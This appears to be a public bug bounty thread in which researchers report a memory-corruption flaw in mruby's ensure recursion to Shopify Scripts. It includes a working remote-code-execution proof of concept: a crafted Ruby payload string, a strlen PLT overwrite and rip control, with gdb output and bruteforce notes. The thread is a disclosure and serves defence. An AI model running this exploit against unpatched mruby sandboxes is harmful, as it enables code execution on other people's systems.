title: Recursion causing uninitialized memory reads leading to a segfault

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!

If the above POC doesn't crash the sandbox reliably, try increasing the n parameter (it crashes for me with n = 30). Also, a small correction: the memory errors and segfault are caused by holding onto the old `mrb->c->ci` pointer in the `ci` variable after the calls to `ecall` which sometimes reallocate into a different block. The call to `cipop` needed to be moved so the fix can work because `cipop` modifies `mrb->c->ci`.

Thank you,
Dinko Galetic and 
Denis Kasak
Thank you for your report. We've reproduced the issue locally, and opened an issue upstream: https://github.com/mruby/mruby/issues/3423

Update: This bug can be also be used for remote code execution. We managed to
exploit mruby by taking control of `regs`, `acc`, `v` and `pc` of the struct
pointed to by `ci` in the `L_RETURN` block of `mrb_vm_exec` to overwrite the
`strlen` PLT entry. Control of the mentioned variables was achieved by
allocating large Ruby strings in the ensure loop which eventually end up in the
memory deallocated by `realloc`.

The following code succeeds in exploiting mruby locally for us:

```
def f(n)
    return 32766 + 24239 # 0xdead
    ensure
    if n==0
    else
        $a = "\xa0\x40\x6b\0\0\0\0\0KhAKiAKjAKkAKlAKmAKnAKoA\x08\xa3\x70\0\0\0\0\0AKsAKtAKuAKv\0\0\0\0KxAKyAKzAK1AK2AK3AK4AK5AK6AK7AK8AK9AK0ALBALCALDALEALFALGALHALIALJALKALLA" * 8 if n % 2 == 0
        String.new(str="")
        f(n-1)
    end
end
f(122)
```

Running the program results in the following segfault, demonstrating control of
`rip`:

    Program received signal SIGSEGV, Segmentation fault.
    0x000000000000dead in ?? ()

Controlling `regs`, `acc` and `v` in combination allows us to overwrite any 16
bytes of memory via the following line (`vm.c`, 1715):

    regs[acc] = v;

By allocating large de Bruijn strings inside the ensure recursion, the bytes
that land on each member of the `callinfo` struct are clearly marked. A sample
gdb output from one of our test runs shows that the value of `stackent` 
corresponds to the substring "JmAJnAJo", `acc` corresponds to "4AJ5", and so 
on. 

    (gdb) print *ci
    $2 = {mid = 1097353793, proc = 0x416c4a416b4a416a, stackent = 
    0x6f4a416e4a416d4a, nregs = 1097878081, ridx = 1245802826, eidx = 1934246258, 
    env = 0x774a41764a41754a, pc = 0x4a417 94a41784a41, err = 0x41324a41314a417a, 
    argc = 1245786954, acc = 894058804, target_class = 0x4a41374a41364a41}

These bytes are then set to point the write at a PLT entry for `strlen`:

    00000000006b40a0 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5

Note: This address will obviously be different on a different binary, but
running a bruteforce attack (or having another information disclosure vector)
will eventually cause the desired RCE. To demonstrate it on your platform, you
would have to look at the output of `objdump -R <mruby binary> | grep strlen`
and replace our payload substring (see below) with that address.

A small complication is that the returned value `v` gets slightly modified at 
some point before the assignment if the returned literal is greater than 32766. 
This can be circumvented by using basic arithmetic, e.g. 
`return 32766 * 215 + 5846` would set `v` to 0x6b9528.

In the payload string `$a`, the address of the overwritten PLT entry is
referenced by the substring `\xa0\x40\x6b\0\0\0\0\0`, which ends up as the
value of `regs`, with `acc` being set to 0.

Finally, to make sure `strlen` is called, we set `pc` such that the next
instruction executed is `OP_ERR` (opcode number 75), e.g.:

    (gdb) find 0x6c0000,0x7f0000,75
    0x6c5b34
    0x6c5de8
    0x6e4564
    0x6e6688
    ***0x70a308***
    0x70c6eb
    0x721c10
    7 patterns found.

    (gdb) x 0x70a308
    0x70a308:       0x4b
    (gdb) p 0x4b
    $130 = 75

This is the `\x08\xa3\x70\0\0\0\0\0` of the payload string. The `OP_ERR` opcode
will call `strlen` soon after (`E_RUNTIME_ERROR` -> `mrb_exc_get` ->
`mrb_class_get_under` -> `class_from_sym` -> `mrb_intern` ->` strlen`).

Thanks again for your report. The patch was accepted upstream in https://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81

So that we can validate the RCE proof-of-concept, could you please provide the full details of what git SHA of mruby (and/or mruby-engine) you tested that on, what compiler you used to build it, what operating system you built on, how you launched the debugger, etc.? Thanks!

Our next round of bounty decisions will take place in about two weeks, so we'll be in touch with you again soon.

We have built mruby with the following commit checked out: 
6420951463ec9ace9eecb50923dc6a1925a45d31

And mruby-engine with: 09be20e

We have tested it on two platforms:
* Arch Linux (with all packages updated as of 2017-02-09), built with gcc version 6.3.1 20170109 (GCC), glibc-2.24.
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 
(Ubuntu 4.8.4-2ubuntu1~14.04.3), libc 2.19-0ubuntu6.9. Debugger CGDB 0.6.7, 
ran with the above POC saved as `payload`:

`cgdb --args mruby/bin/mruby payload`

We also discovered improvements to the original POC in the meantime. The attached
POC works on the sandbox, and it is no longer necessary to search the memory
for the value 75; instead we get an appropriate value (33) in a direct manner
through object_id. The updated POC was tested with either:

* `/home/<user>/mruby-engine/bin/sandbox payload-updated`
*  `cgdb --args ruby /home/<user>/mruby-engine/bin/sandbox payload-updated`
Thanks for the additional information! I'll let you know once we've reproduced your results.

Just to follow up, I was able to reproduce your RCE proof of concept, so we'll take that into account when deciding the final bounty amount. Our next round of bounty payouts should be happening before long.
Thanks for helping improve the security of Shopify Scripts and the MRuby project!
